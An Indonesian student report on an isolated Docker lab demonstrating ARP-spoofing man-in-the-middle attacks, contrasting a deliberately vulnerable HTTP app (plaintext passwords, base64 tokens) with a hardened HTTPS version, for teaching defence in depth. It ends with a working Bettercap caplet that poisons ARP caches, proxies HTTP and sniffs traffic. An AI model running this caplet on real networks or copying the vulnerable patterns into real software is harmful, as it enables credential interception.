# Laporan Tugas Kelompok 5

# Analisis dan Demonstrasi Serangan Man-in-the-Middle melalui ARP Spoofing pada Aplikasi Web Berbasis Container

**Mata Kuliah:** Network Programming & Administration
**Semester:** 5
**Kelompok:** 5

---

## 1. Pendahuluan

### 1.1 Latar Belakang

Perkembangan teknologi informasi yang pesat membawa tantangan baru dalam keamanan jaringan. Salah satu ancaman yang paling mendasar namun tetap relevan adalah serangan **Man-in-the-Middle (MITM)** melalui teknik **ARP Spoofing**. Serangan ini mengeksploitasi kelemahan protokol Address Resolution Protocol (ARP) [11] yang bersifat *stateless* dan tidak memiliki mekanisme autentikasi, sehingga memungkinkan penyerang menyisipkan diri di antara komunikasi dua pihak yang sah.

Menurut framework MITRE ATT&CK, serangan ini diklasifikasikan sebagai **T1557 (Adversary-in-the-Middle)** [1] dengan sub-teknik **T1557.002 (ARP Cache Poisoning)** [2]. Setelah posisi MITM tercapai, penyerang dapat melakukan **T1040 (Network Sniffing)** [3] untuk menangkap data sensitif seperti kredensial pengguna.

Dalam konteks OWASP Top 10:2025 [4], serangan ini berkaitan erat dengan:

- **A04:2025 (Cryptographic Failures)** — kegagalan mengimplementasikan enkripsi pada transmisi data [4]
- **A02:2025 (Security Misconfiguration)** — konfigurasi keamanan yang tidak memadai [4]
- **A07:2025 (Authentication Failures)** — kelemahan dalam mekanisme autentikasi [4]

Project ini mengaitkan dengan tugas sebelumnya yaitu **reconnaissance capturing network traffic menggunakan Wireshark** pada koneksi kantor saat jam kerja dan jam istirahat, dimana ditemukan bahwa beberapa akses masih menggunakan protokol HTTP tanpa enkripsi yang rentan terhadap penyadapan.

### 1.2 Rumusan Masalah

1. Bagaimana mekanisme serangan ARP Spoofing dapat mengeksploitasi kelemahan protokol ARP untuk mencapai posisi Man-in-the-Middle?
2. Bagaimana perbandingan dampak serangan terhadap aplikasi yang menggunakan HTTP (tanpa enkripsi) versus HTTPS (dengan TLS)?
3. Apa solusi efektif untuk mengamankan komunikasi dari serangan MITM/ARP Spoofing?

### 1.3 Tujuan Penelitian

1. Mendemonstrasikan serangan ARP Spoofing dalam lingkungan lab yang terisolasi menggunakan container Docker
2. Membandingkan kerentanan aplikasi HTTP vs HTTPS terhadap penyadapan data
3. Mengimplementasikan dan mengevaluasi solusi keamanan terhadap serangan MITM

### 1.4 Batasan Penelitian

- Demonstrasi dilakukan dalam lingkungan lab terisolasi menggunakan Docker dan Tailscale
- Fokus pada serangan ARP Spoofing sebagai metode MITM
- Aplikasi demo menggunakan React (frontend) dan Node.js Express (backend)

---

## 2. Tinjauan Pustaka

### 2.1 Address Resolution Protocol (ARP)

ARP adalah protokol Layer 2 (Data Link) yang berfungsi memetakan alamat IP (Layer 3) ke alamat MAC (Layer 2) dalam jaringan lokal [11]. Proses ARP bekerja sebagai berikut:

1. Host mengirim **ARP Request** broadcast: "Siapa yang memiliki IP x.x.x.x?"
2. Host dengan IP tersebut merespons dengan **ARP Reply** unicast: "IP x.x.x.x ada di MAC aa:bb:cc:dd:ee:ff"
3. Hasil disimpan dalam **ARP Cache** untuk efisiensi

**Kelemahan fundamental ARP:**

- **Stateless**: Tidak ada mekanisme state tracking
- **No Authentication**: ARP Reply diterima tanpa verifikasi
- **Gratuitous ARP**: Host menerima ARP Reply meskipun tidak pernah mengirim Request

**Implementasi dalam Project:**

- Vulnerable App: ARP dieksploitasi oleh `arp_spoof.py` (Scapy) dan Bettercap [12] untuk meracuni ARP cache container, sehingga traffic melewati host attacker [5]
- Secure App: Meskipun ARP Spoofing tetap berhasil di Layer 2, perlindungan dilakukan di layer lebih atas (TLS) [16]

### 2.2 Model TCP/IP dan Konteks Serangan

Untuk memahami posisi setiap protokol keamanan, penting mengetahui model TCP/IP yang menjadi dasar komunikasi jaringan:

```
┌─────────────────────────────────────────────────────────┐
│ Layer 4: Application    │ HTTP, HTTPS, DNS, JWT, HSTS   │
│                         │ → Data aplikasi (credentials) │
├─────────────────────────┼───────────────────────────────┤
│ Layer 3: Transport      │ TCP, UDP                      │
│                         │ → TLS/SSL beroperasi di sini  │
├─────────────────────────┼───────────────────────────────┤
│ Layer 2: Internet       │ IP (IPv4/IPv6)                │
│                         │ → Routing antar jaringan      │
├─────────────────────────┼───────────────────────────────┤
│ Layer 1: Network Access │ ARP, Ethernet, Wi-Fi          │
│                         │ → ARP Spoofing terjadi di     │
│                         │   layer ini                   │
└─────────────────────────┴───────────────────────────────┘
```

**Relevansi:**

- Serangan ARP Spoofing terjadi di **Layer 1 (Network Access)** — memanipulasi pemetaan IP-to-MAC
- Setelah posisi MITM tercapai, attacker dapat membaca data di **Layer 4 (Application)** jika tidak ada enkripsi
- **TLS/SSL** beroperasi antara Layer 3-4, mengenkripsi data sebelum dikirim melalui jaringan
- Inilah mengapa TLS efektif: meskipun attacker mengontrol Layer 1-2, data di Layer 4 tetap terenkripsi

### 2.3 Protokol HTTP (Hypertext Transfer Protocol)

HTTP adalah protokol Layer 4 (Application) untuk komunikasi client-server di web [21]. HTTP bersifat **stateless** dan secara default **tidak terenkripsi**.

**Cara Kerja HTTP:**

1. Client (browser) membuat koneksi TCP ke server port **80** (default)
2. Client mengirim HTTP Request (method, headers, body)
3. Server memproses dan mengirim HTTP Response (status code, headers, body)
4. Semua data dikirim dalam **plaintext** — dapat dibaca oleh siapapun di jaringan

**Struktur HTTP Request (Login):**

```
POST /api/login HTTP/1.1          ← Method dan endpoint
Host: vulnerable-app:5000         ← Server tujuan
Content-Type: application/json    ← Format data

{"username":"admin","password":"admin123"}  ← PLAINTEXT!
```

**Kelemahan HTTP dari segi keamanan:**

| Kelemahan                       | Dampak                                            | OWASP Reference |
| ------------------------------- | ------------------------------------------------- | --------------- |
| Tidak ada enkripsi              | Credential terbaca plaintext saat MITM            | A04:2025        |
| Tidak ada integrity check       | Data bisa dimodifikasi di tengah jalan            | A04:2025        |
| Tidak ada server authentication | Client tidak bisa memverifikasi identitas server  | A07:2025        |
| Rentan terhadap sniffing        | Wireshark/tcpdump dapat membaca seluruh isi paket | A02:2025        |

**Implementasi dalam Project (Vulnerable App):**

- Backend Express berjalan di port **5000** tanpa TLS
- Frontend React mengakses API via `http://` — seluruh request/response plaintext
- Login endpoint `POST /api/login` mengirim username dan password tanpa enkripsi
- Saat di-sniff (Wireshark filter: `http.request.method == "POST"`), kredensial terbaca jelas

### 2.4 Protokol HTTPS (HTTP Secure)

HTTPS adalah HTTP yang dibungkus dengan lapisan enkripsi **TLS/SSL** [17]. HTTPS menjamin tiga aspek keamanan:

| Aspek                                   | Penjelasan                                                     |
| --------------------------------------- | -------------------------------------------------------------- |
| **Confidentiality** (Kerahasiaan) | Data dienkripsi — tidak bisa dibaca pihak ketiga              |
| **Integrity** (Integritas)        | Data tidak bisa dimodifikasi tanpa terdeteksi                  |
| **Authentication** (Autentikasi)  | Client dapat memverifikasi identitas server melalui sertifikat |

**Perbedaan HTTP vs HTTPS:**

| Aspek              | HTTP                  | HTTPS                         |
| ------------------ | --------------------- | ----------------------------- |
| Port default       | 80                    | 443                           |
| Enkripsi           | Tidak ada             | TLS/SSL                       |
| URL prefix         | `http://`           | `https://`                  |
| Sertifikat         | Tidak diperlukan      | Diperlukan (X.509)            |
| Performance        | Lebih cepat (sedikit) | Overhead TLS handshake        |
| Data saat di-sniff | Plaintext terbaca     | Ciphertext tidak terbaca      |
| Wajib untuk        | —                    | Login, payment, data sensitif |

**Implementasi dalam Project (Secure App):**

- Backend Express berjalan di port **5443** dengan HTTPS menggunakan `https.createServer()`
- Self-signed certificate di-generate menggunakan OpenSSL
- Frontend React mengakses API via `https://` — seluruh data terenkripsi
- Saat di-sniff (Wireshark filter: `tcp.port == 5443 && tls`), hanya terlihat ciphertext

### 2.5 Protokol TLS/SSL (Transport Layer Security)

TLS (Transport Layer Security) adalah protokol kriptografi yang menyediakan enkripsi antara client dan server [16][22]. TLS adalah penerus SSL (Secure Sockets Layer) yang sudah tidak aman.

| Versi         | Status        | Catatan                                      |
| ------------- | ------------- | -------------------------------------------- |
| SSL 2.0 / 3.0 | ❌ Deprecated | Memiliki kerentanan serius (POODLE, DROWN)   |
| TLS 1.0 / 1.1 | ❌ Deprecated | Dianggap tidak aman sejak 2020               |
| TLS 1.2       | ✅ Masih aman | Didukung luas, minimum yang direkomendasikan |
| TLS 1.3       | ✅ Terbaru    | Handshake lebih cepat, lebih aman            |

**Proses TLS Handshake:**

```
Client (Browser)                         Server (Express HTTPS)
       │                                        │
       │──── 1. ClientHello ────────────────────▶│
       │     (TLS version, cipher suites,        │
       │      random number)                     │
       │                                        │
       │◀─── 2. ServerHello ────────────────────│
       │     (Chosen cipher, server random,      │
       │      server certificate)                │
       │                                        │
       │──── 3. Key Exchange ───────────────────▶│
       │     (Client verifies certificate,       │
       │      generates pre-master secret,       │
       │      encrypted with server public key)  │
       │                                        │
       │◀──▶ 4. Both derive session keys ◀──────│
       │     (Symmetric encryption keys          │
       │      from pre-master secret)            │
       │                                        │
       │◀──▶ 5. Encrypted Communication ◀──────▶│
       │     (All data encrypted with            │
       │      symmetric session keys)            │
       │                                        │
```

**Langkah-langkah detail:**

1. **ClientHello**: Browser mengirim versi TLS yang didukung, daftar cipher suite, dan random number
2. **ServerHello**: Server memilih cipher suite, mengirim sertifikat digital (X.509), dan random number
3. **Certificate Verification**: Client memverifikasi sertifikat server terhadap Certificate Authority (CA)
4. **Key Exchange**: Client menghasilkan pre-master secret, mengenkripsinya dengan public key server
5. **Session Keys**: Kedua pihak menurunkan symmetric session key dari pre-master secret
6. **Encrypted Data**: Semua komunikasi selanjutnya dienkripsi dengan session key (AES-GCM)

**Cipher Suite yang digunakan dalam project:**

```
TLS_AES_256_GCM_SHA384        → TLS 1.3, AES 256-bit, GCM mode
TLS_CHACHA20_POLY1305_SHA256  → TLS 1.3, ChaCha20 stream cipher
ECDHE-RSA-AES256-GCM-SHA384   → TLS 1.2, Elliptic Curve key exchange
```

**Implementasi dalam Project:**

```javascript
// secure-app/backend/server.js
const options = {
  key: fs.readFileSync('certs/server.key'),   // Private key RSA 2048-bit
  cert: fs.readFileSync('certs/server.crt'),  // X.509 certificate
  minVersion: 'TLSv1.2',                     // Minimum TLS 1.2
  ciphers: 'TLS_AES_256_GCM_SHA384:...'      // Strong ciphers only
};
https.createServer(options, app).listen(5443);
```

**Mengapa TLS efektif melawan MITM:**

- Meskipun ARP Spoofing berhasil mengarahkan traffic melalui attacker, data yang lewat sudah terenkripsi
- Attacker hanya melihat **ciphertext** (data acak) — bukan plaintext
- Tanpa private key server, attacker **tidak dapat mendekripsi** session key

### 2.6 HSTS (HTTP Strict Transport Security)

HSTS adalah mekanisme keamanan web yang memaksa browser untuk **selalu menggunakan HTTPS**, mencegah downgrade ke HTTP [18].

**Cara Kerja HSTS:**

1. Server mengirim header: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
2. Browser menyimpan instruksi ini selama `max-age` (1 tahun)
3. Setiap request berikutnya ke domain tersebut **otomatis di-upgrade** ke HTTPS
4. Jika sertifikat tidak valid, browser **menolak koneksi** (tidak ada opsi bypass)

**Relevansi terhadap MITM:**

- Tanpa HSTS: Attacker bisa melakukan **SSL Stripping** — menurunkan koneksi dari HTTPS ke HTTP
- Dengan HSTS: Browser menolak koneksi HTTP, sehingga SSL Stripping gagal

**Implementasi dalam Project:**

```javascript
// secure-app/backend/server.js (via Helmet)
app.use(helmet({
  hsts: {
    maxAge: 31536000,        // 1 tahun
    includeSubDomains: true, // Termasuk subdomain
    preload: true            // Bisa didaftarkan ke HSTS Preload List
  }
}));
```

### 2.7 JWT (JSON Web Token)

JWT adalah standar terbuka (RFC 7519) untuk membuat token akses yang aman dan self-contained [19].

**Struktur JWT (3 bagian dipisahkan titik):**

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpM
└──── Header ────────┘ └──────────── Payload ─────────────────────────┘ └─── Signature ──────┘
```

| Bagian              | Isi                                                | Fungsi                |
| ------------------- | -------------------------------------------------- | --------------------- |
| **Header**    | `{"alg": "HS256", "typ": "JWT"}`                 | Algoritma signing     |
| **Payload**   | `{"userId": 1, "username": "admin", "exp": ...}` | Data user (claims)    |
| **Signature** | `HMACSHA256(header + payload, secret)`           | Verifikasi integritas |

**Perbandingan JWT (Secure) vs Base64 Token (Vulnerable):**

| Aspek          | Base64 Token (Vulnerable) | JWT (Secure)                  |
| -------------- | ------------------------- | ----------------------------- |
| Encoding       | Base64 (reversible)       | Base64 + HMAC signature       |
| Integrity      | Tidak ada                 | Signature mencegah tampering  |
| Expiry         | Tidak ada                 | Claim `exp` (1 jam)         |
| Self-contained | Tidak                     | Ya (payload berisi user info) |
| Verifikasi     | String matching           | Cryptographic verification    |

**Implementasi dalam Project:**

```javascript
// Vulnerable (Base64 - mudah di-decode)
const token = Buffer.from(`${user.id}:${user.username}:${Date.now()}`).toString('base64');

// Secure (JWT - signed dan memiliki expiry)
const token = jwt.sign(
  { userId: user.id, username: user.username, role: user.role },
  JWT_SECRET,
  { expiresIn: '1h', issuer: 'secure-app' }
);
```

### 2.8 Bcrypt (Password Hashing)

Bcrypt adalah algoritma hashing adaptif yang dirancang khusus untuk password [20]. Berbeda dengan hash biasa (MD5, SHA), bcrypt dirancang untuk **lambat** sehingga sulit di-brute force.

**Cara Kerja Bcrypt:**

1. Generate random **salt** (16 bytes)
2. Kombinasikan password + salt
3. Jalankan hashing sebanyak **2^cost** iterasi (cost factor / work factor)
4. Hasil: `$2b$12$salt22chars...hash31chars...`

**Format output bcrypt:**

```
$2b$12$LJ3m4ys3Lg/GhVOJLfXQsOaGSLFgzRKP3aF.mZo.Fx6IOYQB3.ONm
 │   │  └──── Salt (22 chars) ────────┘└── Hash (31 chars) ──────┘
 │   └── Cost factor (12 = 2^12 = 4096 iterasi)
 └── Versi bcrypt
```

**Perbandingan Plaintext vs Bcrypt:**

| Aspek               | Plaintext (Vulnerable)   | Bcrypt (Secure)                                 |
| ------------------- | ------------------------ | ----------------------------------------------- |
| Storage             | `admin123`             | `$2b$12$LJ3m4ys3...`                          |
| Reversible          | Ya (password terlihat)   | Tidak (one-way hash)                            |
| Brute force         | Instant                  | ~3 detik per percobaan (cost=12)                |
| Rainbow table       | Efektif                  | Tidak efektif (setiap password punya salt unik) |
| Jika database bocor | Semua password terekspos | Password tetap aman                             |

**Implementasi dalam Project:**

```javascript
// Vulnerable: Plaintext storage
const users = [{ password: 'admin123' }];  // BAHAYA!

// Secure: Bcrypt hashing
const salt = await bcrypt.genSalt(12);
const hashedPassword = await bcrypt.hash('admin123', salt);
// Verifikasi: bcrypt.compare('admin123', hashedPassword) → true
```

### 2.9 Security Headers (Helmet.js)

Security headers adalah HTTP response headers yang menginstruksikan browser untuk menerapkan kebijakan keamanan tertentu [10].

| Header                        | Nilai                               | Fungsi                                             |
| ----------------------------- | ----------------------------------- | -------------------------------------------------- |
| `Content-Security-Policy`   | `default-src 'self'`              | Mencegah XSS dengan membatasi sumber resource      |
| `Strict-Transport-Security` | `max-age=31536000`                | Memaksa HTTPS (HSTS)                               |
| `X-Content-Type-Options`    | `nosniff`                         | Mencegah MIME type sniffing                        |
| `X-Frame-Options`           | `DENY`                            | Mencegah clickjacking via iframe                   |
| `Referrer-Policy`           | `strict-origin-when-cross-origin` | Membatasi informasi referrer                       |
| `X-XSS-Protection`          | `0`                               | Menonaktifkan filter XSS bawaan (mengandalkan CSP) |

**Implementasi dalam Project:**

```javascript
// secure-app/backend/server.js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      frameSrc: ["'none'"],
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));
```

**Vulnerable App**: Tidak menggunakan security headers apapun — browser tidak memiliki instruksi keamanan.

### 2.10 Ringkasan Protokol Keamanan dan Implementasinya

| Protokol | Layer          | Vulnerable App           | Secure App                            | Peran dalam Keamanan |
| -------- | -------------- | ------------------------ | ------------------------------------- | -------------------- |
| ARP      | Network Access | Dieksploitasi (spoofing) | Tetap rentan (mitigasi di layer atas) | Resolusi IP↔MAC     |
| TCP      | Transport      | Plaintext                | Dibungkus TLS                         | Reliable transport   |
| HTTP     | Application    | ✅ Digunakan (port 5000) | ❌ Tidak digunakan                    | Transfer data web    |
| HTTPS    | Application    | ❌ Tidak ada             | ✅ Digunakan (port 5443)              | HTTP + Enkripsi      |
| TLS 1.2+ | Transport/App  | ❌ Tidak ada             | ✅ AES-256-GCM                        | Enkripsi end-to-end  |
| HSTS     | Application    | ❌ Tidak ada             | ✅ max-age=1 tahun                    | Paksa HTTPS          |
| JWT      | Application    | ❌ Base64 token          | ✅ HMAC-signed                        | Auth token aman      |
| Bcrypt   | Application    | ❌ Plaintext             | ✅ Cost=12                            | Hash password        |
| CSP      | Application    | ❌ Tidak ada             | ✅ Helmet                             | Anti XSS             |
| MongoDB  | Data           | ❌ Plaintext pwd di DB   | ✅ Bcrypt hash di DB                  | Penyimpanan data     |
| Audit Log| Application    | ❌ Tidak ada             | ✅ MongoDB audit_logs (TTL 7d)        | Security monitoring  |

### 2.11 Man-in-the-Middle Attack

MITM adalah kategori serangan dimana penyerang secara diam-diam menyisipkan diri di antara komunikasi dua pihak, memungkinkan penyadapan atau modifikasi data [1]. Dalam MITRE ATT&CK framework:

| Technique               | ID        | Deskripsi                            |
| ----------------------- | --------- | ------------------------------------ |
| Adversary-in-the-Middle | T1557     | Posisi attacker di antara dua pihak  |
| ARP Cache Poisoning     | T1557.002 | Meracuni ARP cache dengan MAC palsu  |
| Network Sniffing        | T1040     | Menangkap data dari traffic jaringan |

### 2.12 OWASP Top 10:2025 yang Relevan [4]

| Ranking | ID       | Nama                                 | Relevansi                               |
| ------- | -------- | ------------------------------------ | --------------------------------------- |
| A01     | A01:2025 | Broken Access Control                | Akses endpoint tanpa autentikasi        |
| A02     | A02:2025 | Security Misconfiguration            | CORS terbuka, tanpa security headers    |
| A04     | A04:2025 | Cryptographic Failures               | HTTP plaintext, password tanpa hashing  |
| A07     | A07:2025 | Authentication Failures              | Token tanpa expiry, tanpa rate limiting |
| A09     | A09:2025 | Security Logging & Alerting Failures | Logging kredensial dalam plaintext      |

### 2.13 Penelitian Terdahulu

#### Penelitian 1: Lee, H., Kwon, S., & Lee, J.-H. (2023)

**"Experimental Analysis of Security Attacks for Docker Container Communications"**
*Electronics (MDPI), Volume 12, Issue 4, Article 940.* DOI: 10.3390/electronics12040940

URL: https://www.mdpi.com/2079-9292/12/4/940

- **Metode**: Simulasi serangan siber (ARP Spoofing, DDoS, Elevation of Privilege) dalam lingkungan komunikasi antar container Docker
- **Temuan**: Docker bridge network default rentan terhadap ARP poisoning antar container; dampak diukur dari traffic, CPU, dan reverse shell
- **Keterbatasan**: Fokus pada analisis dampak serangan, belum menyediakan solusi implementatif atau perbandingan dengan versi aman

#### Penelitian 2: Du, W. - SEED Labs (Syracuse University)

**"ARP Cache Poisoning Attack Lab"**
*SEED Security Labs, Syracuse University.*

URL: https://seedsecuritylabs.org/Labs_20.04/Networking/ARP_Attack/

- **Metode**: Container-based lab (Docker) dengan tiga host (Host A, Host B, Host M sebagai attacker); menggunakan Scapy untuk konstruksi paket ARP
- **Temuan**: Demonstrasi efektif ARP cache poisoning menggunakan ARP request, ARP reply, dan gratuitous ARP; dilanjutkan dengan MITM attack
- **Keterbatasan**: Bersifat edukatif; fokus pada mekanisme serangan, kurang pada mitigasi layer aplikasi (TLS, JWT, dll.)

#### Penelitian 3: Kumar, M. & Dash, C.S. (2024)

**"Detecting and Preventing ARP Spoofing Attacks Using Real-Time Data Analysis and Machine Learning"**
*International Journal of Innovative Research in Computer Science and Technology (IJIRCST), 2024.*

URL: https://ijircst.org/view_abstract.php?title=Detecting-and-Preventing-ARP-Spoofing-Attacks-Using-Real-Time-Data-Analysis-and-Machine-Learning&year=2024&vol=12&primary=QVJULTEzMDk=

- **Metode**: Evaluasi lima algoritma ML (Random Forest, LSTM, CNN, SVM, Isolation Forest) untuk deteksi ARP Spoofing berdasarkan analisis traffic real-time
- **Temuan**: Random Forest mencapai akurasi tertinggi (~94%) di antara model yang diuji
- **Keterbatasan**: Memerlukan training data yang besar dan pre-processing yang tepat; kompleksitas deployment di production environment

### 2.14 Perbandingan dengan Metode yang Diusulkan

| Aspek                 | Penelitian Sebelumnya          | Metode yang Diusulkan                       |
| --------------------- | ------------------------------ | ------------------------------------------- |
| Arsitektur            | Monolitik / script sederhana   | **Microservices** (Frontend, Backend, Database terpisah) |
| Environment           | Docker bridge sederhana        | Docker bridge (Layer 2) + Kali Linux container |
| Database              | Tidak ada / in-memory          | **MongoDB** (shared instance, 2 database)    |
| Penyimpanan Password  | Tidak dibandingkan             | Plaintext (vulnerable_db) vs Bcrypt (secure_db) |
| Aplikasi Demo         | Script sederhana / static page | Full-stack React + Express (2 versi)        |
| Versi Aman            | Tidak disediakan               | HTTPS + TLS, JWT, bcrypt, Helmet, HSTS      |
| Perbandingan          | Hanya serangan                 | Side-by-side HTTP vs HTTPS + DB comparison  |
| Framework Referensi   | Beragam                        | MITRE ATT&CK + OWASP Top 10:2025           |
| Mitigasi Layer App    | Teori / tidak ada              | Implementasi TLS, Helmet, JWT, bcrypt       |
| Mitigasi Layer Data   | Tidak ada                      | Schema validation, audit logging, TTL       |
| Mitigasi Layer Network| Static ARP (teori)             | Tailscale VPN sebagai secure management plane |
| Attacker Environment  | Script manual di host          | Container Kali Linux (pre-installed tools)  |
| Deteksi ML            | Memerlukan data besar          | Menyediakan .pcap dataset untuk future ML   |

**Kontribusi/Perbaikan terhadap Keterbatasan Penelitian Terdahulu:**

1. **Menjawab Lee et al. (2023)** [6] — *"Belum menyediakan solusi implementatif atau perbandingan dengan versi aman"*
   - **Solusi:** Menyediakan arsitektur **microservices** dengan dua versi aplikasi (vulnerable HTTP vs secure HTTPS) yang terhubung ke satu database MongoDB. Demonstrasi menunjukkan bahwa **infrastruktur database yang sama** menghasilkan keamanan yang **berbeda** tergantung bagaimana aplikasi memperlakukan data (plaintext vs bcrypt hash).
   - **Tambahan:** Tailscale VPN diimplementasikan sebagai secure management plane — akses SSH dan database server hanya melalui WireGuard tunnel, tidak terekspos di bridge network yang rentan [8].

2. **Menjawab Du, W. — SEED Labs** [5] — *"Kurang pada mitigasi layer aplikasi (TLS, JWT, dll.)"*
   - **Solusi:** Mengimplementasikan Defense in Depth di **empat layer**: transport (TLS 1.2+, HSTS), aplikasi (JWT, bcrypt, Helmet, rate limiting, input validation, audit logging), data (schema validation, select:false, TTL, unique index), dan network (VPN management plane). Setiap mitigasi diukur efektivitasnya melalui percobaan sniffing.

3. **Menjawab Kumar & Dash (2024)** [7] — *"Memerlukan training data besar dan kompleksitas deployment"*
   - **Solusi:** Project ini menyediakan environment yang menghasilkan dataset traffic (.pcap) dari skenario serangan nyata (ARP Spoofing + MITM), yang dapat digunakan sebagai training data untuk model ML detection di penelitian lanjutan. Pendekatan rule-based (Wireshark display filter) [13] digunakan sebagai alternatif deteksi yang lebih ringan tanpa memerlukan training.

---

## 3. Metodologi Penelitian

### 3.1 Diagram Alur Penelitian

```
Studi Literatur → Perancangan Arsitektur → Implementasi Aplikasi
       ↓                                           ↓
Analisis MITRE ATT&CK              Build Vulnerable App (HTTP)
Analisis OWASP Top 10              Build Secure App (HTTPS)
       ↓                                           ↓
       └───────── Konfigurasi Lab (Docker + Tailscale) ──────┘
                              ↓
                    Eksekusi Serangan MITM
                      (ARP Spoofing)
                              ↓
              ┌───────────────┼───────────────┐
              ↓                               ↓
    Sniffing HTTP Traffic           Sniffing HTTPS Traffic
    (Kredensial TERBACA)            (Data TERENKRIPSI)
              ↓                               ↓
              └───────── Analisis & Perbandingan ────────┘
                              ↓
                    Kesimpulan & Rekomendasi
```

### 3.2 Arsitektur Sistem

Sistem menggunakan **Docker bridge network** (Layer 2) sebagai broadcast domain bersama, memungkinkan simulasi ARP Spoofing yang realistis. Tailscale VPN diposisikan sebagai **secure management plane** untuk akses SSH dan database.

```
  Docker Bridge Network (lab-network: 172.20.0.0/24) — Layer 2
  ┌────────────────────────────────────────────────────────────────┐
  │                                                                │
  │  ┌─────────────────┐              ┌─────────────────────────┐  │
  │  │ Attacker         │ ARP Spoof   │ Client Victim           │  │
  │  │ (Kali Linux)    │────────────▶│ (webtop XFCE)           │  │
  │  │ 172.20.0.100    │              │ 172.20.0.10             │  │
  │  └─────────────────┘              └──────────┬──────────────┘  │
  │                                    ┌─────────┴─────────┐       │
  │  ┌────────────────────┐     ┌──────┴──────┐    ┌───────┴─────┐ │
  │  │ Database (Shared)  │     │ Vuln App    │    │ Sec App     │ │
  │  │ (MongoDB)          │◀────│ HTTP        │    │ HTTPS (TLS) │ │
  │  │ 172.20.0.50 :27017 │◀────│ .20 :3000   │    │ .30 :3443   │ │
  │  │ ┌───────────────┐  │     │ .21 :5000   │    │ .31 :5443   │ │
  │  │ │vulnerable_db  │  │     └─────────────┘    │ ┌─────────┐ │ │
  │  │ │(PLAINTEXT pwd)│  │                        │ │Tailscale│ │ │
  │  │ ├───────────────┤  │                        │ │(SSH/DB) │ │ │
  │  │ │secure_db      │  │                        │ └─────────┘ │ │
  │  │ │(BCRYPT hash)  │  │                        └─────────────┘ │
  │  │ └───────────────┘  │                                        │
  │  └────────────────────┘                                        │
  └────────────────────────────────────────────────────────────────┘
```

**Arsitektur Microservices:** Setiap komponen (frontend, backend, database) dipisahkan ke container masing-masing. Satu instance MongoDB melayani kedua aplikasi — **perbedaan keamanan ada di layer aplikasi** (bagaimana data disimpan dan ditransmisikan), bukan di infrastruktur database.

**1. Database (MongoDB — 172.20.0.50)**

- Satu instance MongoDB (`mongo:7`) yang melayani kedua aplikasi
- **`vulnerable_db`**: Password disimpan dalam **plaintext** — demonstrasi kerentanan OWASP A04:2025
- **`secure_db`**: Password disimpan sebagai **bcrypt hash** (cost 12) — solusi keamanan
- Init script (`init-mongo.js`) melakukan seeding data saat container pertama kali distart
- Ini mendemonstrasikan bahwa keamanan **bukan hanya soal infrastruktur** (database sama), tapi bagaimana **aplikasi memperlakukan data sensitif**

**2. Attacker (Kali Linux — 172.20.0.100)**

- Container `kalilinux/kali-rolling` dengan Scapy, Bettercap, tshark, arp-scan
- Menjalankan ARP Spoofing antara client-victim dan server pada bridge network
- Akses: `docker compose exec attacker bash`

**3. Client Victim (webtop — 172.20.0.10)**

- Container `linuxserver/webtop:alpine-xfce` — desktop Linux dengan browser GUI
- Diakses dari host via `http://localhost:3080`
- Target utama ARP Spoofing — traffic-nya diintersep oleh attacker

**4. Vulnerable Stack (HTTP — 172.20.0.20/21)**

- React Frontend (port 3000) dan Express Backend (port 5000) — tanpa enkripsi
- Backend terhubung ke MongoDB `vulnerable_db` — password disimpan plaintext

**5. Secure Stack (HTTPS — 172.20.0.30/31)**

- React Frontend (port 3443) dan Express Backend (port 5443) — dengan TLS, Helmet, JWT, bcrypt
- Backend terhubung ke MongoDB `secure_db` — password disimpan sebagai bcrypt hash
- **Tailscale sidecar** — SSH dan database hanya diakses via WireGuard tunnel

| Container | IP | Port | Peran |
| --------- | -- | ---- | ----- |
| database | 172.20.0.50 | 27017 | MongoDB (shared) |
| attacker | 172.20.0.100 | — | Kali Linux (MITM) |
| client-victim | 172.20.0.10 | 3080→3000 | Victim desktop |
| vuln-frontend | 172.20.0.20 | 3000 | HTTP frontend |
| vuln-backend | 172.20.0.21 | 5000 | HTTP backend → vulnerable_db |
| sec-frontend | 172.20.0.30 | 3443 | HTTPS frontend |
| sec-backend | 172.20.0.31 | 5443 | HTTPS backend → secure_db |
| ts-secure | (shared) | — | Tailscale VPN (SSH/DB) |

### 3.3 Teknologi yang Digunakan

| Komponen             | Teknologi               | Versi      |
| -------------------- | ----------------------- | ---------- |
| Frontend             | React                   | 18.x       |
| Backend              | Node.js (Express)       | 20.x / 4.x |
| Database             | MongoDB                 | 7.x        |
| ODM                  | Mongoose                | 8.x        |
| Container            | Docker & Docker Compose | Latest     |
| Attacker Container   | Kali Linux (kali-rolling) | Latest   |
| VPN Management Plane | Tailscale [8]           | Latest     |
| Attack Tool (Script) | Python (Scapy)          | 3.x        |
| Attack Tool (MITM)   | Bettercap [12]          | 2.x        |
| Traffic Analyzer     | Wireshark / tshark [13][14] | 4.x   |
| TLS/SSL              | OpenSSL                 | Latest     |
| Security Headers     | Helmet                  | 8.x        |
| Auth Token           | JWT (jsonwebtoken)      | 9.x        |
| Password Hashing     | bcryptjs                | 2.x        |

### 3.4 Tools Serangan yang Digunakan

#### 3.4.1 Bettercap

Bettercap adalah Swiss Army knife untuk serangan jaringan [12]. Digunakan sebagai tool utama untuk ARP Spoofing dan sniffing karena kelebihannya [15]:

| Fitur             | Deskripsi                                                      |
| ----------------- | -------------------------------------------------------------- |
| ARP Spoof Module  | Otomatis melakukan ARP cache poisoning (full-duplex)           |
| HTTP Proxy        | Mengintercept dan menampilkan HTTP traffic secara real-time    |
| Network Sniffer   | Menangkap seluruh traffic dan menyimpan sebagai file `.pcap` |
| Caplet Scripting  | Mendukung scripting (`.cap`) untuk otomasi serangan          |
| Credential Parser | Otomatis mendeteksi dan menampilkan kredensial dari HTTP POST  |

**Caplet yang digunakan (`mitm_attack.cap`):**

```
# Aktifkan network discovery
net.probe on
sleep 3

# ARP Spoofing full-duplex
set arp.spoof.fullduplex true
set arp.spoof.targets <TARGET_IP>
arp.spoof on

# HTTP Proxy untuk intercept traffic
http.proxy on

# Sniffer - simpan ke pcap untuk Wireshark
set net.sniff.verbose true
set net.sniff.output /tmp/bettercap-capture.pcap
net.sniff on
```

